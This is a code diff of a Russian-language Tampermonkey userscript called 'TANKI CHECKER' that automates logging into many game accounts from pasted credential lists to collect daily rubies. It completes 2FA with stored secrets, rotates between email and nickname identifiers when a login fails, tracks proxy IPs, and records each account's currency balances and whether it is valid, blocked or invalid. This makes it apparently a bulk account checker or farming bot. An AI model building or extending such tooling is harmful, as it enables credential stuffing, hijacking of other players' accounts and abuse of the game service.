         try { sessionStorage.removeItem('entrance_hash_key'); } catch (_) {}
         console.log('[Daily Rubies] 🧹 entrance_hash_key очищен (настройки скрипта целы)');
     }
+
+    // =========================================================
+    // localStorage QUOTA GUARD (данные Tampermonkey НЕ трогаем)
+    // =========================================================
+    const LS_PRESERVE_KEYS = new Set([
+        "entrance_hash_key",
+        "tanki_saved_accounts"
+    ]);
+
+    function getPageLocalStorage() {
+        try {
+            if (typeof unsafeWindow !== "undefined" && unsafeWindow.localStorage) return unsafeWindow.localStorage;
+        } catch (_) {}
+        return localStorage;
+    }
+
+    function measureLocalStorage(ls) {
+        ls = ls || getPageLocalStorage();
+        let total = 0;
+        const items = [];
+        try {
+            for (let i = 0; i < ls.length; i++) {
+                const key = ls.key(i);
+                if (key == null) continue;
+                let val = "";
+                try { val = ls.getItem(key) || ""; } catch (_) {}
+                const size = (String(key).length + String(val).length) * 2;
+                total += size;
+                items.push({ key: String(key), size });
+            }
+        } catch (_) {}
+        items.sort((a, b) => b.size - a.size);
+        return { total, items };
+    }
+
+    function isDroppableGameStorageKey(key) {
+        if (!key || LS_PRESERVE_KEYS.has(key)) return false;
+        if (/^tanki_(acc_|accounts|settings|running|mode|rubies|2fa|valid|queue|captcha)/i.test(key)) return false;
+        if (/^GM_|^__tamper|^tm_/i.test(key)) return false;
+        if (/NOTIFICATION/i.test(key)) return true;
+        if (/CHALLENGE/i.test(key)) return true;
+        if (/ORDINARY/i.test(key)) return true;
+        if (/TIER/i.test(key)) return true;
+        if (/QUEST/i.test(key) && /CACHE|STATE|SEEN|READ/i.test(key)) return true;
+        if (/BATTLEPASS|BATTLE_PASS/i.test(key)) return true;
+        if (/ANALYTICS|SENTRY|SEGMENT|AMPLITUDE/i.test(key)) return true;
+        if (/CACHE/i.test(key)) return true;
+        if (/TOAST|POPUP|BANNER|HINT/i.test(key)) return true;
+        if (/NEWS|MAIL|INBOX/i.test(key)) return true;
+        return false;
+    }
+
+    function cleanupTankiLocalStorage(options = {}) {
+        const ls = getPageLocalStorage();
+        const aggressive = !!options.aggressive;
+        const before = measureLocalStorage(ls);
+        let removed = 0;
+        let freed = 0;
+        const dropped = [];
+
+        const tryRemove = (key, size) => {
+            if (LS_PRESERVE_KEYS.has(key)) return false;
+            try {
+                ls.removeItem(key);
+                removed++;
+                freed += size || 0;
+                dropped.push(key);
+                return true;
+            } catch (_) {
+                return false;
+            }
+        };
+
+        for (const { key, size } of before.items) {
+            if (isDroppableGameStorageKey(key)) tryRemove(key, size);
+        }
+
+        const mid = measureLocalStorage(ls);
+        const QUOTA_SOFT = 4.5 * 1024 * 1024; 
+        if (aggressive || mid.total > QUOTA_SOFT) {
+            for (const { key, size } of mid.items) {
+                if (LS_PRESERVE_KEYS.has(key)) continue;
+                if (/^tanki_(acc_|accounts|settings|running|mode|rubies|2fa|valid|queue)/i.test(key)) continue;
+                if (size >= 20 * 1024 || aggressive) {
+                    tryRemove(key, size);
+                }
+                const now = measureLocalStorage(ls);
+                if (now.total < 2.5 * 1024 * 1024) break;
+            }
+        }
+
+        const after = measureLocalStorage(ls);
+        if (removed > 0) {
+            console.log(
+                `[Storage Guard] Очистка localStorage: −${removed} ключей, ~${Math.round(freed / 1024)}KB. ` +
+                `Было ~${Math.round(before.total / 1024)}KB → стало ~${Math.round(after.total / 1024)}KB. ` +
+                `Сохранён entrance_hash_key. Данные Checker/TM не трогались.`
+            );
+        }
+        return { removed, freed, before: before.total, after: after.total, dropped };
+    }
+
+    function ensureLocalStorageSpace() {
+        const ls = getPageLocalStorage();
+        const { total } = measureLocalStorage(ls);
+        if (total > 3.5 * 1024 * 1024) {
+            return cleanupTankiLocalStorage({ aggressive: total > 4.5 * 1024 * 1024 });
+        }
+        return { removed: 0, freed: 0, before: total, after: total };
+    }
+
+    function isQuotaError(err) {
+        if (!err) return false;
+        const name = err.name || "";
+        const msg = String(err.message || err || "");
+        return name === "QuotaExceededError" || /quota|QUOTA_EXCEEDED/i.test(msg);
+    }
+
+    function safeLocalStorageSetItem(key, value) {
+        const ls = getPageLocalStorage();
+        try {
+            ls.setItem(key, value);
+            return true;
+        } catch (e) {
+            if (!isQuotaError(e)) {
+                console.warn("[Storage Guard] setItem failed", key, e);
+                return false;
+            }
+            console.warn("[Storage Guard] QuotaExceeded на setItem — автоочистка…", key);
+            cleanupTankiLocalStorage({ aggressive: true });
+            try {
+                ls.setItem(key, value);
+                return true;
+            } catch (e2) {
+                cleanupTankiLocalStorage({ aggressive: true });
+                try {
+                    ls.setItem(key, value);
+                    return true;
+                } catch (e3) {
+                    console.error("[Storage Guard] Не удалось записать после очистки", key, e3);
+                    return false;
+                }
+            }
+        }
+    }
+
+    function startLocalStorageQuotaWatcher() {
+        let lastClean = 0;
+        const maybeCleanFromDom = () => {
+            const now = Date.now();
+            if (now - lastClean < 15000) return; 
+            const bodyText = (document.body && document.body.innerText) || "";
+            if (!/QuotaExceededError|NOTIFICATIONS_ORDINARY_CHALLENGE|exceeded the quota/i.test(bodyText)) return;
+            lastClean = now;
+            console.warn("[Storage Guard] Обнаружен QuotaExceeded в UI игры — очистка");
+            const res = cleanupTankiLocalStorage({ aggressive: true });
+            try {
+                showToast(
+                    res.removed
+                        ? `Storage: очищено ${res.removed} ключей (сессия и базы скрипта целы)`
+                        : "Storage: квота, но чистить почти нечего",
+                    res.removed ? "warning" : "info"
+                );
+            } catch (_) {}
+            try {
+                const btns = document.querySelectorAll("button, .ButtonComponentStyle-button, [class*='button']");
+                for (const b of btns) {
+                    const t = (b.textContent || "").trim().toLowerCase();
+                    if (t === "ок" || t === "ok" || t === "закрыть" || t === "close") {
+                        b.click();
+                        break;
+                    }
+                }
+            } catch (_) {}
+        };
+
+        try {
+            const mo = new MutationObserver(() => maybeCleanFromDom());
+            mo.observe(document.documentElement, { childList: true, subtree: true, characterData: true });
+        } catch (_) {}
+        setInterval(maybeCleanFromDom, 8000);
+        setInterval(() => {
+            try { ensureLocalStorageSpace(); } catch (_) {}
+        }, 5 * 60 * 1000);
+    }
+
 
     function accountNeedsPasswordLogin(account) {
         if (!account) return true;
@@ -5403,7 +6417,21 @@ async function testDiscordNotification() {
             year: account.year || existing.year || source?.year || null,
             rankFromBase: account.rankFromBase || existing.rankFromBase || source?.rankFromBase || null,
             bound: account.bound !== undefined && account.bound !== null ? account.bound :
-                   (existing.bound !== undefined && existing.bound !== null ? existing.bound : (source?.bound ?? null))
+                   (existing.bound !== undefined && existing.bound !== null ? existing.bound : (source?.bound ?? null)),
+            nickname: account.nickname || existing.nickname || source?.nickname || null,
+            newNickname: account.newNickname || existing.newNickname || source?.newNickname || null,
+            experience: account.experience ?? existing.experience ?? source?.experience ?? null,
+            rubies: account.rubies != null ? account.rubies : (existing.rubies ?? source?.rubies ?? null),
+            crystals: account.crystals != null ? account.crystals : (existing.crystals ?? source?.crystals ?? null),
+            goldBoxes: account.goldBoxes != null ? account.goldBoxes : (existing.goldBoxes ?? source?.goldBoxes ?? null),
+            tankoins: account.tankoins != null ? account.tankoins : (existing.tankoins ?? source?.tankoins ?? null),
+            nickChange: account.nickChange || existing.nickChange || source?.nickChange || null,
+            bonusReceived: isBonusConfirmed(account.bonusReceived) ? true :
+                (isBonusConfirmed(existing.bonusReceived) ? true :
+                (account.bonusReceived === false || existing.bonusReceived === false ? false : null)),
+            proxyIp: account.proxyIp || existing.proxyIp || source?.proxyIp || null,
+            checkedAt: account.checkedAt || existing.checkedAt || source?.checkedAt || null,
+            twofaSecret: account.twofaSecret || existing.twofaSecret || source?.twofaSecret || null
         };
 
         if (existingIndex >= 0) RUBIES_ACCOUNTS[existingIndex] = merged;
@@ -5412,6 +6440,9 @@ async function testDiscordNotification() {
         const st = getAccountStatus(login) || {};
         st.rubiesEnabled = true;
         st.rubiesEligible = true;
+        if (isBonusConfirmed(merged.bonusReceived) || isBonusConfirmed(account.bonusReceived)) {
+            st.bonusReceived = true;
+        }
         setAccountStatus(login, st);
         saveRubiesAccounts();
         return true;
@@ -5508,47 +6539,173 @@ async function testDiscordNotification() {
         setAccountStatus(login, st);
     }
 
-    function getRubiesEligibleAccounts(options = {}) {
+    function bulkChangeRubiesStatus(fromStatus, toStatus) {
+        fromStatus = String(fromStatus || "").trim();
+        toStatus = String(toStatus || "").trim();
+        if (!toStatus) return { changed: 0, total: 0 };
+
+        let changed = 0;
+        const total = RUBIES_ACCOUNTS.length;
+        const touched = [];
+
+        for (const acc of RUBIES_ACCOUNTS) {
+            if (!acc || !acc.login) continue;
+            let st = {};
+            try {
+                st = getAccountStatus(acc.login) || {};
+            } catch (_) {
+                st = {};
+            }
+            const current = getRubiesDisplayStatus(st);
+            if (fromStatus !== "*" && current !== fromStatus) continue;
+            const next = Object.assign({}, st, {
+                rubiesManuallySet: true,
+                rubiesStatus: toStatus
+            });
+
+            next.rubiesNoDaily = false;
+            next.rubiesSubscriptionFinished = false;
+            next.rubiesSkipPermanent = false;
+            next.invalid = false;
+            next.blocked = false;
+            next.twofa = false;
+            next.rubiesError = null;
+            next.rubiesEnabled = true;
+            next.rubiesEligible = true;
+
+            if (toStatus === "Собрано") {
+                next.lastRubiesCollection = new Date().toISOString();
+            } else {
+                next.lastRubiesCollection = null;
+            }
+
+            if (toStatus === "Нет дейликов") {
+                next.rubiesNoDaily = true;
+                next.rubiesEligible = false;
+            } else if (toStatus === "Подписка завершена") {
+                next.rubiesSubscriptionFinished = true;
+                next.rubiesEligible = false;
+            } else if (toStatus === "2FA") {
+                next.twofa = true;
+            } else if (toStatus === "Заблокирован") {
+                next.blocked = true;
+                next.rubiesSkipPermanent = true;
+                next.rubiesEnabled = false;
+            } else if (toStatus === "Ошибка") {
+                next.rubiesError = "manual";
+            } else if (toStatus === "Отключён") {
+                next.rubiesEnabled = false;
+                next.rubiesSkipPermanent = true;
+            }
+
+            try {
+                setAccountStatus(acc.login, next);
+                const check = getAccountStatus(acc.login) || {};
+                if (getRubiesDisplayStatus(check) !== toStatus && check.rubiesStatus !== toStatus) {
+                    console.warn("[Daily Rubies] bulk write mismatch", acc.login, check);
+                }
+                changed++;
+                touched.push(acc.login);
+            } catch (e) {
+                console.error("[Daily Rubies] bulk set failed", acc.login, e);
+            }
+        }
+
+        console.log(`[Daily Rubies] Массовая смена: ${fromStatus} → ${toStatus}: ${changed}/${total}`, touched.slice(0, 10));
+        return { changed, total, fromStatus, toStatus, touched };
+    }
+
+    function isRubiesTerminalFail(st) {
+        if (!st) return false;
+        const ds = (st.rubiesStatus || "").trim();
+        if (ds === "Не собрано" && st.rubiesManuallySet) return false;
+        if (st.deleted) return true;
+        if (st.blocked && ds === "Заблокирован") return true;
+        if (st.rubiesSkipPermanent && ds !== "Не собрано") return true;
+        if (st.invalid && ds !== "Не собрано") return true;
+        if (st.twofa === true && (ds === "2FA" || st.reason) && ds !== "Не собрано") return true;
+        if (ds === "Ошибка" && (st.invalid || st.reason)) return true;
+        return false;
+    }
+
+    function advanceRubiesQueuePast(login) {
+        const queue = getRubiesRunQueue();
+        let nextCursor;
+        if (login && queue.length) {
+            const pos = queue.indexOf(login);
+            nextCursor = pos >= 0 ? pos + 1 : currentIndex + 1;
+        } else {
+            nextCursor = currentIndex + 1;
+        }
+        saveRubiesRunCursor(nextCursor);
+        currentIndex = nextCursor;
+        return nextCursor;
+    }
+
+    const RUBIES_STATUS_OPTIONS = [
+        "Не собрано",
+        "Собрано",
+        "Ошибка",
+        "2FA",
+        "Заблокирован",
+        "Нет дейликов",
+        "Подписка завершена"
+    ];
+
+    function getRubiesDisplayStatus(st) {
+        st = st || {};
+        if (st.rubiesSubscriptionFinished) return "Подписка завершена";
+        if (st.rubiesNoDaily) return "Нет дейликов";
+        if (st.rubiesStatus) return String(st.rubiesStatus);
+        if (isRubiesCollectedToday(st)) return "Собрано";
+        return "Не собрано";
+    }
+
+    function accountMatchesRubiesStatusFilter(acc, st, options = {}) {
+        st = st || {};
         const includeCollected = !!options.includeCollected;
+        const includeFailed = !!options.includeFailed;
+        const ds = getRubiesDisplayStatus(st);
+
+        if (CONFIG.RUBIES_SKIP_FINISHED && (st.rubiesSubscriptionFinished || ds === "Подписка завершена")) return false;
+
+        if (ds === "Не собрано") return true;
+
+        if (st.rubiesEnabled === false || ds === "Отключён") return false;
+        if (ds === "Нет дейликов") return false;
+        if (!includeFailed && isRubiesTerminalFail(st)) return false;
+        if (!includeCollected && (ds === "Собрано" || st.rubiesStatus === "Собрано")) return false;
+        if (!includeCollected && isRubiesCollectedToday(st)) return false;
+        return true;
+    }
+
+    function getRubiesEligibleAccounts(options = {}) {
         return RUBIES_ACCOUNTS.filter(acc => {
             const st = getAccountStatus(acc.login) || {};
-            if (CONFIG.RUBIES_SKIP_FINISHED && st.rubiesSubscriptionFinished) return false;
-            if (st.rubiesEnabled === false) return false;
-            if (!includeCollected && st.rubiesStatus === "Собрано") return false;
-            if (!includeCollected && isRubiesCollectedToday(st)) return false;
-            return true;
+            return accountMatchesRubiesStatusFilter(acc, st, options);
         });
     }
+
 
     function addRubiesAccountsFromText(text) {
         const parsed = sortAccounts(String(text || ''));
         let added = 0;
+        let skippedNoBonus = 0;
         let twofaLinked = 0;
         for (const account of parsed) {
-            if (addRubiesAccount(account)) added++;
-            const secret = account.twofaSecret
-                ? String(account.twofaSecret).replace(/\s+/g, "").toUpperCase()
-                : null;
-            if (secret && /^[A-Z2-7]{16,}$/.test(secret) && account.login) {
-                upsert2FAAccount({
-                    login: account.login,
-                    password: account.password || null,
-                    email: account.email || null,
-                    nickname: account.nickname || account.login,
-                    secret,
-                    rank: account.rankFromBase || null,
-                    experience: account.experience ?? null,
-                    rubies: account.rubies || "0",
-                    crystals: account.crystals || "0",
-                    tankoins: account.tankoins || "0",
-                    bound: account.bound ?? null,
-                    year: account.year ?? null,
-                    activatedAt: new Date().toISOString()
-                });
-                twofaLinked++;
+            if (account.twofaSecret || account.secret) {
+                try {
+                    track2FAFromAccount(account);
+                    twofaLinked++;
+                } catch (_) {}
             }
+            if (!isBonusConfirmed(account.bonusReceived)) {
+                skippedNoBonus++;
+                continue;
+            }
+            if (addRubiesAccount(account)) added++;
         }
-        return { added, parsed: parsed.length, twofaLinked };
+        return { added, parsed: parsed.length, twofaLinked, skippedNoBonus };
     }
 
     // =========================================================
@@ -5601,8 +6758,7 @@ async function testDiscordNotification() {
             const acc = shuffledAccounts[i];
             if (!acc) continue;
             const st = getAccountStatus(acc.login) || {};
-            if (st.rubiesStatus === "Собрано" || isRubiesCollectedToday(st)) continue;
-            if (CONFIG.RUBIES_SKIP_FINISHED && st.rubiesSubscriptionFinished) continue;
+            if (!accountMatchesRubiesStatusFilter(acc, st)) continue;
             return true;
         }
         return false;
@@ -5843,9 +6999,12 @@ async function testDiscordNotification() {
         } catch (_) {}
 
         let timestamp = new Date().toLocaleTimeString();
-        console.log(`[Daily Rubies] 🔐 Авторизация: ${login}`);
 
-        let usedLogin = normalizeEmail(email) || login, loginWasEmail = !!normalizeEmail(email);
+        const authInfo = getRubiesAuthIdentifier(acc, prev);
+        let usedLogin = authInfo.primary.id;
+        let loginWasEmail = authInfo.primary.kind === "email" || !!normalizeEmail(usedLogin);
+        let authCandidateIdx = 0;
+        console.log(`[Daily Rubies] 🔐 Авторизация: ${login} → вход как «${usedLogin}» (${authInfo.primary.kind})`, authInfo.candidates.map(c => c.kind + ":" + c.id));
         try {
             if (checkConnectionError()) { location.reload(); return { login, status: "reload" }; }
 
@@ -5903,7 +7062,21 @@ async function testDiscordNotification() {
 
             let triedEmail = false;
             let lobbyReached = false;
+            let loginLoopTicks = 0;
+            const LOGIN_LOOP_MAX = 48;
             while (isRunning) {
+                loginLoopTicks++;
+                if (loginLoopTicks > LOGIN_LOOP_MAX) {
+                    console.warn(`[Daily Rubies] ⏱ ${login}: таймаут входа — пропуск`);
+                    setAccountStatus(login, {
+                        ...prev,
+                        rubiesStatus: "Ошибка",
+                        rubiesSkipPermanent: true,
+                        reason: "Таймаут входа"
+                    });
+                    advanceRubiesQueuePast(login);
+                    return { login, status: "login_timeout" };
+                }
                 timestamp = new Date().toLocaleTimeString();
                 if (checkConnectionError()) { location.reload(); return { login, status: "reload" }; }
                 if (await reloadIfLoginFormEmptyTooLong(5000)) return { login, status: "reload_empty" };
@@ -5912,35 +7085,74 @@ async function testDiscordNotification() {
                 if (captchaResult) return captchaResult;
 
                 if (isLogin2FAVisible()) {
-                    const solved = await solveLogin2FAIfPresent(login, email);
+                    const solved = await solveLogin2FAIfPresent(login, email, acc);
                     if (solved === "solved") {
                         resetCaptchaCount("2FA solved rubies");
                         await sleep(400);
                         continue;
                     }
                     resetCaptchaCount("2FA");
-                    setAccountStatus(login, { ...prev, twofa: true, rubiesStatus: "2FA", reason: solved === "no_secret" ? "2FA: нет секрета" : "Требуется 2FA" });
-                    currentIndex++;
+                    setAccountStatus(login, {
+                        ...prev,
+                        twofa: true,
+                        rubiesStatus: "2FA",
+                        rubiesSkipPermanent: true,
+                        reason: solved === "no_secret" ? "2FA: нет секрета" : "Требуется 2FA"
+                    });
+                    advanceRubiesQueuePast(login);
                     return { login, status: "twofa" };
                 }
                 const blocked = document.querySelector(".SystemMessageStyle-message");
                 if (blocked && blocked.textContent.includes("заблокирован")) {
                     resetCaptchaCount("blocked");
-                    setAccountStatus(login, { ...prev, blocked: true, rubiesStatus: "Заблокирован", reason: "Аккаунт заблокирован" });
-                    currentIndex++;
+                    setAccountStatus(login, {
+                        ...prev,
+                        blocked: true,
+                        rubiesStatus: "Заблокирован",
+                        rubiesSkipPermanent: true,
+                        reason: "Аккаунт заблокирован"
+                    });
+                    advanceRubiesQueuePast(login);
                     return { login, status: "blocked" };
                 }
-                const errorElement = document.querySelector(".EntranceComponentStyle-invalidForm");
-                if (errorElement) {
-                    if (!triedEmail && normalizeEmail(email)) {
-                        triedEmail = true; usedLogin = email; loginWasEmail = true;
-                        await sleep(200);
-                        await enterCredentialsAndPlay(usedLogin, password);
+                const errorElement = document.querySelector(
+                    ".EntranceComponentStyle-invalidForm, .EntranceComponentStyle-commonBlockMessageError, .textError, [class*='invalidForm']"
+                );
+                const errText = (errorElement?.textContent || "").toLowerCase();
+                const isBadCreds = !!errorElement && (
+                    errText.includes("неправильн") ||
+                    errText.includes("неверн") ||
+                    errText.includes("парол") ||
+                    errText.includes("логин") ||
+                    !!document.querySelector(".EntranceComponentStyle-invalidForm")
+                );
+                if (isBadCreds) {
+                    authCandidateIdx++;
+                    while (authCandidateIdx < authInfo.candidates.length) {
+                        const next = authInfo.candidates[authCandidateIdx];
+                        if (next && next.id && next.id.toLowerCase() !== String(usedLogin).toLowerCase()) {
+                            usedLogin = next.id;
+                            loginWasEmail = next.kind === "email" || !!normalizeEmail(usedLogin);
+                            console.log(`[Daily Rubies] 🔁 ${login}: неверный вход, пробуем «${usedLogin}» (${next.kind})`);
+                            await sleep(200);
+                            await enterCredentialsAndPlay(usedLogin, password);
+                            break;
+                        }
+                        authCandidateIdx++;
+                    }
+                    if (authCandidateIdx < authInfo.candidates.length) {
                         continue;
                     }
                     resetCaptchaCount("invalid");
-                    setAccountStatus(login, { ...prev, invalid: true, rubiesStatus: "Ошибка", reason: "Неверный логин/пароль" });
-                    currentIndex++;
+                    setAccountStatus(login, {
+                        ...prev,
+                        invalid: true,
+                        rubiesStatus: "Ошибка",
+                        rubiesSkipPermanent: true,
+                        reason: "Неверный логин/пароль"
+                    });
+                    advanceRubiesQueuePast(login);
+                    console.log(`[Daily Rubies] ❌ ${login}: неверный логин/пароль — пропуск`);
                     return { login, status: "invalid" };
                 }
                 if (document.querySelector(".UserInfoContainerStyle-userNameRank")) {
@@ -5950,9 +7162,40 @@ async function testDiscordNotification() {
                 }
                 await sleep(250);
             }
-            if (!lobbyReached) return { login, status: "lobby_missing" };
+            if (!lobbyReached) {
+                console.warn(`[Daily Rubies] ⚠ ${login}: лобби не загрузилось — пропуск`);
+                setAccountStatus(login, {
+                    ...prev,
+                    rubiesStatus: "Ошибка",
+                    reason: "Лобби не загрузилось"
+                });
+                advanceRubiesQueuePast(login);
+                return { login, status: "lobby_missing" };
+            }
 
-            console.log(`[Daily Rubies] ✅ Лобби загружено`);
+            console.log(`[Daily Rubies] ✅ Лобби загружено (вход: ${usedLogin})`);
+            try {
+                if (usedLogin && String(usedLogin).toLowerCase() !== String(login).toLowerCase()) {
+                    const idxA = RUBIES_ACCOUNTS.findIndex(a => a.login === login);
+                    if (idxA >= 0) {
+                        if (normalizeEmail(usedLogin)) {
+                            RUBIES_ACCOUNTS[idxA].email = normalizeEmail(usedLogin);
+                        } else {
+                            RUBIES_ACCOUNTS[idxA].newNickname = usedLogin;
+                            RUBIES_ACCOUNTS[idxA].nickname = usedLogin;
+                        }
+                        saveRubiesAccounts();
+                    }
+                    const pSt = getAccountStatus(login) || {};
+                    if (!normalizeEmail(usedLogin)) {
+                        pSt.newNickname = usedLogin;
+                        pSt.username = pSt.username || usedLogin;
+                    } else {
+                        pSt.loginEmail = normalizeEmail(usedLogin);
+                    }
+                    setAccountStatus(login, pSt);
+                }
+            } catch (_) {}
             await sleep(800);
             await ensureInLobby();
 
@@ -6170,9 +7413,12 @@ async function testDiscordNotification() {
                 if (currentIndex >= total) return null;
                 const acc = shuffledAccounts[currentIndex];
                 const st = getAccountStatus(acc.login) || {};
-                if (CONFIG.RUBIES_SKIP_FINISHED && st.rubiesSubscriptionFinished) { currentIndex++; attempts++; continue; }
-                if (st.rubiesStatus === "Собрано" || isRubiesCollectedToday(st)) { currentIndex++; attempts++; continue; }
-                if (st.rubiesEnabled === false) { currentIndex++; attempts++; continue; }
+                if (!accountMatchesRubiesStatusFilter(acc, st)) {
+                    const ds = getRubiesDisplayStatus(st);
+                    console.log(`[Daily Rubies] ⏭ ${acc.login}: статус «${ds}» не в фильтре — пропуск`);
+                    saveRubiesRunCursor(currentIndex + 1);
+                    currentIndex++; attempts++; continue;
+                }
                 return acc;
             }
             return null;
@@ -6223,7 +7469,79 @@ async function testDiscordNotification() {
     const style = document.createElement("style");
     style.id = "tchecker-styles";
     style.textContent = `
+
+/* ===== RUBIES BULK STATUS ===== */
+.rub-bulk-box{
+  background:var(--tc-surface-2, rgba(255,255,255,.04));
+  border:1px solid var(--tc-border, rgba(255,255,255,.08));
+  border-radius:12px;
+  padding:14px 16px;
+  margin-bottom:18px;
+}
+.rub-bulk-hint{
+  font-size:12px;
+  color:var(--tc-text-dim, #9aa3b2);
+  line-height:1.45;
+  margin-bottom:12px;
+}
+.rub-bulk-row{
+  display:flex;
+  flex-wrap:wrap;
+  align-items:flex-end;
+  gap:12px;
+}
+.rub-bulk-field{
+  display:flex;
+  flex-direction:column;
+  gap:6px;
+  min-width:160px;
+  flex:1;
+}
+.rub-bulk-label{
+  font-size:11px;
+  font-weight:600;
+  letter-spacing:.04em;
+  text-transform:uppercase;
+  color:var(--tc-text-muted, #7d8696);
+}
+.rub-bulk-select{
+  appearance:none;
+  background:var(--tc-surface, #1a1f2b);
+  color:var(--tc-text, #e8ecf4);
+  border:1px solid var(--tc-border, rgba(255,255,255,.12));
+  border-radius:10px;
+  padding:10px 12px;
+  font-size:13px;
+  min-height:40px;
+  cursor:pointer;
+  outline:none;
+  width:100%;
+}
+.rub-bulk-select:focus{
+  border-color:var(--tc-accent, #5b8cff);
+  box-shadow:0 0 0 3px rgba(91,140,255,.2);
+}
+.rub-bulk-arrow{
+  font-size:18px;
+  color:var(--tc-text-dim, #9aa3b2);
+  padding-bottom:8px;
+  flex:0 0 auto;
+}
+.rub-bulk-btn{
+  min-height:40px;
+  padding:0 18px;
+  flex:0 0 auto;
+}
+.rub-bulk-preview{
+  margin-top:12px;
+  font-size:12px;
+  color:var(--tc-text-muted, #7d8696);
+  padding:8px 10px;
+  border-radius:8px;
+  background:rgba(0,0,0,.15);
+}
 /* ===== RESET / BASE ===== */
+
 #tc-menu.tchecker-ui,
 #tc-menu.tchecker-ui *,
 #tc-overlay.tchecker-ui,
@@ -6916,7 +8234,7 @@ async function testDiscordNotification() {
             <aside class="tc-tabs">
                 <div class="tc-brand">
                     <div class="tc-brand-mark">yal</div>
-                    <div class="tc-brand-text"><b>TANKI CHECKER</b><small>1.0.1</small></div>
+                    <div class="tc-brand-text"><b>TANKI CHECKER</b><small>1.0.3</small></div>
                 </div>
                 <div class="tc-nav">
                     <div class="tc-nav-label">Main</div>
@@ -7050,7 +8368,10 @@ ivan13000;d1f2y3z4
             if (!value) return showToast("Вставь хотя бы один аккаунт", "warning");
             const result = addRubiesAccountsFromText(value);
             if (!result.added) {
-                showToast("Не удалось распознать аккаунты", "warning");
+                const skipMsg = result.skippedNoBonus
+                    ? `Нет аккаунтов с «Компенсация - да» (пропущено: ${result.skippedNoBonus})`
+                    : "Не удалось распознать аккаунты";
+                showToast(skipMsg, "warning");
                 return;
             }
             textarea.value = "";
@@ -7058,7 +8379,8 @@ ivan13000;d1f2y3z4
             close();
             renderRubies();
             const extra = result.twofaLinked ? ` · 2FA: ${result.twofaLinked}` : "";
-            showToast(`Добавлено в Daily Rubies: ${result.added}${extra}`, "success");
+            const skip = result.skippedNoBonus ? ` · без компенсации: ${result.skippedNoBonus}` : "";
+            showToast(`Добавлено в Daily Rubies: ${result.added}${extra}${skip}`, "success");
         });
     }
 
@@ -7613,6 +8935,8 @@ ivan13000;d1f2y3z4
             setRunningState(true);
             isPaused = false;
             try { clearEmptyLoginReloadState(); } catch (_) {}
+            try { clearCaptchaProxyFailState("manual start"); } catch (_) {}
+            try { resetCaptchaCount("manual start"); } catch (_) {}
             showToast("Started (" + MODE + ")", "success");
             startChecking();
             updateUI();
@@ -7745,11 +9069,31 @@ ivan13000;d1f2y3z4
 
     function getRubiesVisibleStatus(acc) {
         const st = getAccountStatus(acc.login) || acc.status || {};
-        if (acc._source === "archive" || st.rubiesSubscriptionFinished) return { cls: "tag-error", text: "ENDED" };
-        if (st.rubiesEnabled === false) return { cls: "tag-error", text: "DISABLED" };
-        if (st.rubiesStatus === "Собрано" || isRubiesCollectedToday(st)) return { cls: "tag-done", text: "СОБРАНО" };
-        if (st.rubiesStatus === "Ошибка") return { cls: "tag-error", text: "ОШИБКА" };
-        return { cls: "tag-ready", text: "ГОТОВ" };
+        const ds = typeof getRubiesDisplayStatus === "function"
+            ? getRubiesDisplayStatus(st)
+            : (st.rubiesStatus || "Не собрано");
+        if (acc._source === "archive" && ds !== "Подписка завершена") {
+            return { cls: "tag-error", text: "Архив" };
+        }
+        switch (ds) {
+            case "Собрано":
+                return { cls: "tag-done", text: "Собрано" };
+            case "Ошибка":
+                return { cls: "tag-error", text: "Ошибка" };
+            case "2FA":
+                return { cls: "tag-error", text: "2FA" };
+            case "Заблокирован":
+                return { cls: "tag-error", text: "Заблокирован" };
+            case "Нет дейликов":
+                return { cls: "tag-error", text: "Нет дейликов" };
+            case "Подписка завершена":
+                return { cls: "tag-error", text: "Подписка завершена" };
+            case "Отключён":
+                return { cls: "tag-error", text: "Отключён" };
+            case "Не собрано":
+            default:
+                return { cls: "tag-ready", text: "Не собрано" };
+        }
     }
 
     function renderAllRubiesAccountsPanel() {
@@ -7849,14 +9193,58 @@ ivan13000;d1f2y3z4
                 e.preventDefault();
                 e.stopPropagation();
                 const login = btn.dataset.login;
-                const st = getAccountStatus(login) || {};
-                const nextCollected = st.rubiesStatus !== "Собрано";
-                setRubiesCollectedStatus(login, nextCollected);
-                showToast(nextCollected ? `${login}: СОБРАНО` : `${login}: НЕ СОБРАНО`, "info");
+                cycleRubiesAccountStatus(login);
                 renderAllRubiesAccountsPanel();
                 updateUI();
             });
+            btn.title = "Клик: ГОТОВ → СОБРАНО → ОШИБКА → ОТКЛ → ГОТОВ";
         });
+    }
+
+    function cycleRubiesAccountStatus(login) {
+        const st = getAccountStatus(login) || {};
+        const status = getRubiesVisibleStatus({ login, _source: "active", ...st });
+        const text = (status.text || "").toUpperCase();
+
+        if (text === "ГОТОВ" || text === "READY") {
+            setRubiesCollectedStatus(login, true);
+            showToast(login + ": СОБРАНО", "info");
+            return;
+        }
+        if (text === "СОБРАНО" || text === "COLLECTED") {
+            st.rubiesStatus = "Ошибка";
+            st.rubiesSkipPermanent = true;
+            st.invalid = false;
+            st.rubiesManuallySet = true;
+            st.lastRubiesCollection = null;
+            setAccountStatus(login, st);
+            showToast(login + ": ОШИБКА (пропуск в очереди)", "warning");
+            return;
+        }
+        if (text === "ОШИБКА" || text === "2FA" || text === "ENDED") {
+            st.rubiesEnabled = false;
+            st.rubiesStatus = "Отключён";
+            st.rubiesSkipPermanent = true;
+            st.rubiesManuallySet = true;
+            setAccountStatus(login, st);
+            showToast(login + ": ОТКЛЮЧЁН", "info");
+            return;
+        }
+        // DISABLED → ГОТОВ
+        st.rubiesEnabled = true;
+        st.rubiesStatus = "Не собрано";
+        st.rubiesSkipPermanent = false;
+        st.invalid = false;
+        st.blocked = false;
+        st.twofa = false;
+        st.deleted = false;
+        st.rubiesSubscriptionFinished = false;
+        st.lastRubiesCollection = null;
+        st.reason = null;
+        st.rubiesError = null;
+        st.rubiesManuallySet = true;
+        setAccountStatus(login, st);
+        showToast(login + ": ГОТОВ", "success");
     }
 
     function bindRubiesAllAccountsPanel() {
@@ -7878,45 +9266,80 @@ ivan13000;d1f2y3z4
 
         const allEligible = getRubiesEligibleAccounts();
         const allStored = getAllRubiesVisibleAccounts();
-        const ready = allEligible.filter(a => {
-            const st = getAccountStatus(a.login);
-            return st && !st.rubiesSubscriptionFinished;
-        }).length;
-        const collectedToday = allStored.filter(a => {
+        let cntNotCollected = 0, cntCollected = 0, cntFinished = 0, cntOther = 0;
+        for (const a of RUBIES_ACCOUNTS) {
+            const st = getAccountStatus(a.login) || {};
+            const ds = getRubiesDisplayStatus(st);
